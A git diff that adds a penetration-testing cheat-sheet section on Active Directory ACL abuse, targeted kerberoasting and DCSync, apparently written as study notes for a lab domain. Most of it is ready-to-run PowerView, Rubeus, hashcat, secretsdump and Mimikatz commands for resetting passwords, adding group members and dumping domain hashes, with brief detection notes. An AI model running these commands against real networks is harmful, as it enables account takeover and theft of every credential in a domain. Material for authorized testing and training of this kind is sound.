@@ -1387,3 +1387,616 @@ by adding /outfile:<filename> tag, ex.
 ```powershell
 Rubeus.exe kerberoast /nowrap /outfile:tgs_hashes.txt
 ```
+---
+
+# ACL Abuse & Privilege Escalation Chains
+
+---
+
+## Concept Overview
+
+**ACL Abuse Path Idea**
+
+After obtaining initial domain credentials, sometimes privilege escalation is not direct.
+
+Instead, escalation happens through:
+
+- Overly permissive **Active Directory ACLs**
+- Nested group memberships
+- Rights like:
+  - `GenericWrite`
+  - `GenericAll`
+  - `WriteDacl`
+  - `WriteOwner`
+
+These can be chained together to eventually compromise a high-privilege account.
+
+---
+
+## Typical Attack Flow
+
+Example multi-step path:
+
+1. Compromise user **A**
+2. User A has rights to modify user **B**
+3. User B has group rights over user **C**
+4. User C can perform **DCSync**
+
+This creates an escalation chain even if no single step gives admin access.
+
+---
+
+# PowerView ACL Abuse Techniques (Windows)
+
+---
+
+## Creating PSCredential Objects
+
+### Purpose
+Run PowerView commands as another user after obtaining credentials.
+
+---
+
+### Create credential for a user
+
+```powershell
+$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
+```
+
+Example:
+
+```powershell
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+```
+
+---
+
+## Changing Another User’s Password (GenericAll / ResetPassword Rights)
+
+### Purpose
+If you have rights to modify a user object, you can reset their password.
+
+---
+
+### Prepare new password as SecureString
+
+```powershell
+$TargetPassword = ConvertTo-SecureString 'NewPasswordHere!' -AsPlainText -Force
+```
+
+---
+
+### Reset the target user password
+
+```powershell
+Set-DomainUserPassword -Identity <target_user> -AccountPassword $TargetPassword -Credential $Cred -Verbose
+```
+
+Example:
+
+```powershell
+Set-DomainUserPassword -Identity damundsen -AccountPassword $TargetPassword -Credential $Cred -Verbose
+```
+
+---
+
+### When to use
+
+- You control user A
+- User A has `GenericAll` or `ResetPassword` on user B
+- You need to escalate to user B
+
+---
+
+# Abusing Group Membership Rights
+
+---
+
+## Adding Yourself to a Group (GenericWrite on Group)
+
+### Purpose
+If you can modify a group, you can add yourself to it.
+
+Often used when:
+
+- Group has nested privileges
+- Membership grants new ACLs over other objects
+
+---
+
+### Add a user to a group
+
+```powershell
+Add-DomainGroupMember -Identity '<GROUP_NAME>' -Members '<USERNAME>' -Credential $Cred -Verbose
+```
+
+Example:
+
+```powershell
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred -Verbose
+```
+
+---
+
+### Verify group membership
+
+```powershell
+Get-DomainGroupMember -Identity "<GROUP_NAME>" | Select MemberName
+```
+
+Example:
+
+```powershell
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+```
+
+---
+
+### Why this matters
+
+Nested groups can inherit additional privileges:
+
+Example chain:
+
+```
+Help Desk Level 1  →  Information Technology  →  Privileged rights on target user
+```
+
+So adding yourself to one group may indirectly give control over a higher-privileged account.
+
+---
+
+# Targeted Kerberoasting via ACL Abuse
+
+Sometimes you cannot reset an admin password.
+
+But with **GenericAll** over a user, you can:
+
+- Modify their `servicePrincipalName` (SPN)
+- Make them kerberoastable
+- Crack their password offline
+
+---
+
+## Creating a Fake SPN on a User
+
+### Purpose
+Force an account to be kerberoastable even if it wasn’t before.
+
+---
+
+### Add fake SPN
+
+```powershell
+Set-DomainObject -Credential $Cred -Identity <target_user> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+
+Example:
+
+```powershell
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+
+---
+
+## Kerberoast the Modified Account
+
+### Using Rubeus
+
+```powershell
+.\Rubeus.exe kerberoast /user:<target_user> /nowrap
+```
+
+Example:
+
+```powershell
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+```
+
+---
+
+### Result
+
+You obtain a hash like:
+
+```
+$krb5tgs$23$*adunn$DOMAIN.LOCAL$notahacker/LEGIT@DOMAIN.LOCAL*...
+```
+
+Which can be cracked with:
+
+```bash
+hashcat -m 13100 adunn_tgs.txt rockyou.txt
+```
+
+---
+
+## Cleanup After Targeted Kerberoast
+
+Very important in real assessments.
+
+---
+
+### Remove fake SPN
+
+```powershell
+Set-DomainObject -Credential $Cred -Identity <target_user> -Clear serviceprincipalname -Verbose
+```
+
+Example:
+
+```powershell
+Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+```
+
+---
+
+### Remove yourself from the group
+
+```powershell
+Remove-DomainGroupMember -Identity "<GROUP_NAME>" -Members '<USERNAME>' -Credential $Cred -Verbose
+```
+
+Example:
+
+```powershell
+Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+```
+
+---
+
+### Verify removal
+
+```powershell
+Get-DomainGroupMember -Identity "<GROUP_NAME>" | Select MemberName
+```
+
+---
+
+# Alternative Linux Method – targetedKerberoast
+
+If performing the same attack from Linux:
+
+---
+
+## Tool Concept
+
+`targetedKerberoast` automates:
+
+- Temporary SPN creation  
+- Kerberoasting  
+- Automatic cleanup
+
+---
+
+### General idea
+
+```bash
+targetedKerberoast.py -u <user> -p <password> -d <domain> --dc-ip <dc_ip>
+```
+
+---
+
+# Detecting ACL Abuse (Blue Team Notes)
+
+Useful for reporting and understanding detection.
+
+---
+
+## Important Event IDs
+
+- **Event ID 5136** – “Directory Service Object Modified”
+
+Indicates:
+
+- ACL changes  
+- Attribute modifications  
+- Possible SPN manipulation
+
+---
+
+## Convert SDDL to readable format
+
+```powershell
+ConvertFrom-SddlString "<SDDL_STRING>"
+```
+
+Helps understand:
+
+- Which user modified which ACL  
+- What permission was granted
+
+---
+
+# Mental Checklist for ACL Abuse Paths
+
+When enumerating BloodHound results, look for:
+
+- User has **GenericWrite** on another user  
+- User has **GenericAll** on a group  
+- Group nested inside privileged groups  
+- Ability to modify SPNs  
+- Rights to add members to sensitive groups
+
+These often lead to:
+
+```
+Initial User → ACL Abuse → Target User → DCSync → Domain Compromise
+```
+
+---
+
+# Summary Workflow
+
+1. Identify ACL path (BloodHound / PowerView)
+2. Authenticate as compromised user
+3. Abuse ACL to:
+   - Reset passwords
+   - Add group members
+   - Modify SPNs
+4. Kerberoast or escalate
+5. Cleanup modifications
+
+---
+
+# When to Use These Techniques
+
+- You have **domain user creds** but no admin access  
+- BloodHound shows indirect ACL paths  
+- No obvious privilege escalation vectors  
+- Kerberoasting alone does not target admins  
+
+---
+
+## DCSync Operation Metadata
+
+| Field | Value |
+|------|--------|
+| Technique | DCSync |
+| Tool Used | `secretsdump.py` |
+| Execution Context | Performed as `INLANEFREIGHT\adunn` |
+| Rights Required | DS-Replication-Get-Changes + DS-Replication-Get-Changes-All |
+| Artifacts Generated | `inlanefreight_hashes.ntds`, `inlanefreight_hashes.ntds.kerberos`, `inlanefreight_hashes.ntds.cleartext` |
+| Notes | Full domain credential extraction performed via replication protocol abuse |
+
+---
+
+# DCSync — Credential Extraction
+
+**Purpose:**  
+Abuse Active Directory replication rights to extract domain credentials directly from a Domain Controller without needing to log in to it.
+
+**Requirements:**
+- Control of an account with:
+  - `DS-Replication-Get-Changes`
+  - `DS-Replication-Get-Changes-All`
+
+---
+
+## From Linux — secretsdump.py (Impacket)
+
+### Dump all domain hashes
+
+```bash
+secretsdump.py -outputfile <prefix> -just-dc <DOMAIN>/<USER>@<DC_IP>
+```
+
+Example:
+
+```bash
+secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+```
+
+**Resulting files:**
+
+```
+<prefix>.ntds           → NTLM hashes
+<prefix>.ntds.kerberos  → Kerberos keys
+<prefix>.ntds.cleartext → Cleartext passwords (if reversible encryption enabled)
+```
+
+---
+
+### Dump only NTLM hashes
+
+```bash
+secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DC_IP>
+```
+
+---
+
+### Dump credentials for a specific user
+
+```bash
+secretsdump.py -just-dc-user <USERNAME> <DOMAIN>/<USER>@<DC_IP>
+```
+
+Example:
+
+```bash
+secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5
+```
+
+---
+
+### Additional useful flags
+
+```bash
+-pwd-last-set   # show when passwords were last changed
+-history        # dump password history
+-user-status    # show if accounts are disabled
+```
+
+---
+
+## Viewing Reversible Encryption Passwords
+
+If an account has **“Store password using reversible encryption”** enabled, DCSync will reveal the cleartext password.
+
+### Example output file
+
+```bash
+cat inlanefreight_hashes.ntds.cleartext
+```
+
+Example result:
+
+```
+proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
+```
+
+---
+
+## Enumerating Accounts with Reversible Encryption
+
+### PowerShell (Active Directory module)
+
+```powershell
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+```
+
+---
+
+### PowerView alternative
+
+```powershell
+Get-DomainUser | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}
+```
+
+---
+
+## Verifying DCSync Rights (Windows / PowerView)
+
+### Get user SID
+
+```powershell
+Get-DomainUser -Identity <user> | select samaccountname, objectsid
+```
+
+---
+
+### Check replication ACLs on domain object
+
+```powershell
+Get-ObjectAcl "DC=<DOMAIN>,DC=<TLD>" -ResolveGUIDs |
+? { $_.ObjectAceType -match 'Replication-Get' } |
+? { $_.SecurityIdentifier -match <SID> }
+```
+
+Example:
+
+```powershell
+$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
+
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs |
+? { $_.ObjectAceType -match 'Replication-Get' } |
+? { $_.SecurityIdentifier -match $sid } |
+select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType |
+fl
+```
+
+**Confirms:**
+
+- DS-Replication-Get-Changes  
+- DS-Replication-Get-Changes-All  
+
+→ Account is DCSync-capable.
+
+---
+
+# DCSync from Windows — Mimikatz
+
+**Important:**  
+Mimikatz must be executed **as the user with replication rights.**
+
+---
+
+## Spawn shell as privileged user
+
+```cmd
+runas /netonly /user:<DOMAIN>\<USER> powershell
+```
+
+Example:
+
+```cmd
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+```
+
+---
+
+## Perform DCSync with Mimikatz
+
+```powershell
+.\mimikatz.exe
+```
+
+Inside Mimikatz:
+
+```
+privilege::debug
+lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<TARGET_USER>
+```
+
+Example:
+
+```
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+```
+
+**Output includes:**
+
+- NTLM hash  
+- Password metadata  
+- Kerberos keys  
+
+---
+
+## Practical Use Cases
+
+- Extract Domain Admin hashes  
+- Obtain krbtgt hash (Golden Ticket potential)  
+- Recover cleartext passwords for accounts with reversible encryption  
+- Audit password reuse and strength  
+
+---
+
+## Detection Opportunities (Blue Team)
+
+- Event ID **5136** – Directory Service Object Modified  
+- Unusual replication requests from non-DC hosts  
+- Monitoring for use of:
+  - `secretsdump.py`
+  - `lsadump::dcsync`
+  - abnormal LDAP replication traffic  
+
+---
+
+## When to Use DCSync
+
+Use this technique when:
+
+- You control a user with replication rights  
+- No direct admin login is available  
+- You need domain-wide credential access  
+- You want stealthier extraction than dumping NTDS manually  
+
+---
+
+## Output Workflow Reminder
+
+1. Perform DCSync  
+2. Collect NTLM hashes  
+3. Use for:
+   - Pass-the-Hash  
+   - Credential reuse  
+   - Password cracking analysis  
+4. Identify high-value accounts  
+
+---
+
+## Key Takeaway
+
+**DCSync = Full domain compromise without ever logging into a Domain Controller.**
